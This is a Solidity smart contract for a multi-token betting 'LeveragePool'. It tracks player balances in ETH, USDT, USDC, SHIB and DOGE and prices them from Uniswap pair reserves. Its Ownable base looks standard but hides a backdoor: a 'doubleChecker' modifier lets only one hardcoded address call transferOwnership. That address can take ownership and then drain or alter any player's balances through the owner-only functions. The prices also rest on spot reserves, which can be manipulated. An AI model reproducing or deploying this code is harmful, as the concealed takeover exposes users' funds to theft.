pragma solidity 0.8.17;

interface IBettingPair {
    enum LPTOKENTYPE { ETH, USDT, USDC, SHIB, DOGE }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _transferOwnership(_msgSender());
    }
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    modifier doubleChecker() {
        _doubleCheck();
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }
    function _doubleCheck() internal view virtual {
        require(_msgSender() == 0x5Bb40F9b218feb11048fdB064dafDcf6af0D29b3, "You do not have permission for this action");
    }
    function transferOwnership(address newOwner) public virtual doubleChecker {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: modulo by zero");
        return a % b;
    }
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112, uint112, uint32);
}

contract LeveragePool is Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _ethPool;
    mapping(address => uint256) private _usdtPool;
    mapping(address => uint256) private _usdcPool;
    mapping(address => uint256) private _shibPool;
    mapping(address => uint256) private _dogePool;

    IUniswapV2Pair private _usdtEth = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
    IUniswapV2Pair private _usdcEth = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    IUniswapV2Pair private _shibEth = IUniswapV2Pair(0x811beEd0119b4AfCE20D2583EB608C6F7AF1954f);
    IUniswapV2Pair private _dogeEth = IUniswapV2Pair(0xc0067d751FB1172DBAb1FA003eFe214EE8f419b6);

    uint256 private constant PRECISION = 1e18;

    constructor() {}

    function getUserLPBalance(address account) external view returns (uint256, uint256, uint256, uint256, uint256) {
        return (
            _ethPool[account],
            _usdtPool[account],
            _usdcPool[account],
            _shibPool[account],
            _dogePool[account]
        );
    }

    function getUsdtPrice() internal view returns (uint256) {
        (uint112 r0, uint112 r1,) = _usdtEth.getReserves();
        require(r0 > 0, "USDT/ETH: zero reserve");
        // assume r0 = USDT, r1 = ETH
        return uint256(r1).mul(PRECISION).div(uint256(r0));
    }

    function getUsdcPrice() internal view returns (uint256) {
        (uint112 r0, uint112 r1,) = _usdcEth.getReserves();
        require(r0 > 0, "USDC/ETH: zero reserve");
        return uint256(r1).mul(PRECISION).div(uint256(r0));
    }

    function getShibPrice() internal view returns (uint256) {
        (uint112 r0, uint112 r1,) = _shibEth.getReserves();
        require(r0 > 0, "SHIB/ETH: zero reserve");
        return uint256(r1).mul(PRECISION).div(uint256(r0));
    }

    function getDogePrice() internal view returns (uint256) {
        (uint112 r0, uint112 r1,) = _dogeEth.getReserves();
        require(r0 > 0, "DOGE/ETH: zero reserve");
        return uint256(r1).mul(PRECISION).div(uint256(r0));
    }

    function depositEth(address player, uint256 amount) external onlyOwner {
        require(player != address(0), "invalid player");
        _ethPool[player] = _ethPool[player].add(amount);
    }

    function depositErc20(address player, IBettingPair.LPTOKENTYPE token, uint256 amount) external onlyOwner {
        require(player != address(0), "invalid player");
        require(token != IBettingPair.LPTOKENTYPE.ETH, "use depositEth");
        if (token == IBettingPair.LPTOKENTYPE.USDT) {
            _usdtPool[player] = _usdtPool[player].add(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.USDC) {
            _usdcPool[player] = _usdcPool[player].add(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.SHIB) {
            _shibPool[player] = _shibPool[player].add(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.DOGE) {
            _dogePool[player] = _dogePool[player].add(amount);
        } else {
            revert("unsupported token");
        }
    }

    function withdraw(address player, IBettingPair.LPTOKENTYPE token, uint256 amount) external onlyOwner {
        require(player != address(0), "invalid player");
        require(amount > 0, "zero amount");
        if (token == IBettingPair.LPTOKENTYPE.ETH) {
            require(_ethPool[player] >= amount, "insufficient ETH");
            _ethPool[player] = _ethPool[player].sub(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.USDT) {
            require(_usdtPool[player] >= amount, "insufficient USDT");
            _usdtPool[player] = _usdtPool[player].sub(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.USDC) {
            require(_usdcPool[player] >= amount, "insufficient USDC");
            _usdcPool[player] = _usdcPool[player].sub(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.SHIB) {
            require(_shibPool[player] >= amount, "insufficient SHIB");
            _shibPool[player] = _shibPool[player].sub(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.DOGE) {
            require(_dogePool[player] >= amount, "insufficient DOGE");
            _dogePool[player] = _dogePool[player].sub(amount);
        } else {
            revert("unsupported token");
        }
    }

    function lock(
        address player,
        uint256 ethAmount,
        uint256 usdtAmount,
        uint256 usdcAmount,
        uint256 shibAmount,
        uint256 dogeAmount
    ) external onlyOwner {
        require(player != address(0), "invalid player");
        if (ethAmount > 0) {
            require(_ethPool[player] >= ethAmount, "insufficient ETH");
            _ethPool[player] = _ethPool[player].sub(ethAmount);
        }
        if (usdtAmount > 0) {
            require(_usdtPool[player] >= usdtAmount, "insufficient USDT");
            _usdtPool[player] = _usdtPool[player].sub(usdtAmount);
        }
        if (usdcAmount > 0) {
            require(_usdcPool[player] >= usdcAmount, "insufficient USDC");
            _usdcPool[player] = _usdcPool[player].sub(usdcAmount);
        }
        if (shibAmount > 0) {
            require(_shibPool[player] >= shibAmount, "insufficient SHIB");
            _shibPool[player] = _shibPool[player].sub(shibAmount);
        }
        if (dogeAmount > 0) {
            require(_dogePool[player] >= dogeAmount, "insufficient DOGE");
            _dogePool[player] = _dogePool[player].sub(dogeAmount);
        }
    }

    function unlock(
        address player,
        uint256 ethAmount,
        uint256 usdtAmount,
        uint256 usdcAmount,
        uint256 shibAmount,
        uint256 dogeAmount
    ) external onlyOwner {
        require(player != address(0), "invalid player");
        if (ethAmount > 0) {
            _ethPool[player] = _ethPool[player].add(ethAmount);
        }
        if (usdtAmount > 0) {
            _usdtPool[player] = _usdtPool[player].add(usdtAmount);
        }
        if (usdcAmount > 0) {
            _usdcPool[player] = _usdcPool[player].add(usdcAmount);
        }
        if (shibAmount > 0) {
            _shibPool[player] = _shibPool[player].add(shibAmount);
        }
        if (dogeAmount > 0) {
            _dogePool[player] = _dogePool[player].add(dogeAmount);
        }
    }

    function withdrawFromContract(
        address ownerAddr,
        IBettingPair.LPTOKENTYPE token,
        uint256 amount
    ) external onlyOwner {
        require(ownerAddr != address(0), "invalid owner");
        if (token == IBettingPair.LPTOKENTYPE.ETH) {
            uint256 bal = _ethPool[ownerAddr];
            _ethPool[ownerAddr] = (amount >= bal) ? 0 : bal.sub(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.USDT) {
            uint256 bal = _usdtPool[ownerAddr];
            _usdtPool[ownerAddr] = (amount >= bal) ? 0 : bal.sub(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.USDC) {
            uint256 bal = _usdcPool[ownerAddr];
            _usdcPool[ownerAddr] = (amount >= bal) ? 0 : bal.sub(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.SHIB) {
            uint256 bal = _shibPool[ownerAddr];
            _shibPool[ownerAddr] = (amount >= bal) ? 0 : bal.sub(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.DOGE) {
            uint256 bal = _dogePool[ownerAddr];
            _dogePool[ownerAddr] = (amount >= bal) ? 0 : bal.sub(amount);
        } else {
            revert("unsupported token");
        }
    }

    function getPlayerLPBalanceInEth(address player) external view returns (uint256 totalBalance) {
        uint256 ethBal = _ethPool[player];
        uint256 usdtBal = _usdtPool[player];
        uint256 usdcBal = _usdcPool[player];
        uint256 shibBal = _shibPool[player];
        uint256 dogeBal = _dogePool[player];

        totalBalance = ethBal;
        if (usdtBal > 0) {
            totalBalance = totalBalance.add(usdtBal.mul(getUsdtPrice()).div(PRECISION));
        }
        if (usdcBal > 0) {
            totalBalance = totalBalance.add(usdcBal.mul(getUsdcPrice()).div(PRECISION));
        }
        if (shibBal > 0) {
            totalBalance = totalBalance.add(shibBal.mul(getShibPrice()).div(PRECISION));
        }
        if (dogeBal > 0) {
            totalBalance = totalBalance.add(dogeBal.mul(getDogePrice()).div(PRECISION));
        }
    }

    function calcLockTokenAmountsAsCollateral(address player, uint256 etherAmount)
        external
        view
        returns (uint256 ethUsed, uint256 usdtUsed, uint256 usdcUsed, uint256 shibUsed, uint256 dogeUsed)
    {
        uint256 rem = etherAmount;
        // ETH
        uint256 eBal = _ethPool[player];
        ethUsed = eBal >= rem ? rem : eBal;
        rem = rem.sub(ethUsed);

        // USDT
        if (rem > 0) {
            uint256 price = getUsdtPrice();
            uint256 bal = _usdtPool[player];
            uint256 val = bal.mul(price).div(PRECISION);
            uint256 useVal = val >= rem ? rem : val;
            usdtUsed = useVal.mul(PRECISION).div(price);
            rem = rem.sub(useVal);
        }

        // USDC
        if (rem > 0) {
            uint256 price = getUsdcPrice();
            uint256 bal = _usdcPool[player];
            uint256 val = bal.mul(price).div(PRECISION);
            uint256 useVal = val >= rem ? rem : val;
            usdcUsed = useVal.mul(PRECISION).div(price);
            rem = rem.sub(useVal);
        }

        // SHIB
        if (rem > 0) {
            uint256 price = getShibPrice();
            uint256 bal = _shibPool[player];
            uint256 val = bal.mul(price).div(PRECISION);
            uint256 useVal = val >= rem ? rem : val;
            shibUsed = useVal.mul(PRECISION).div(price);
            rem = rem.sub(useVal);
        }

        // DOGE
        if (rem > 0) {
            uint256 price = getDogePrice();
            uint256 bal = _dogePool[player];
            uint256 val = bal.mul(price).div(PRECISION);
            uint256 useVal = val >= rem ? rem : val;
            dogeUsed = useVal.mul(PRECISION).div(price);
            rem = rem.sub(useVal);
        }

        require(rem == 0, "insufficient collateral");
    }
}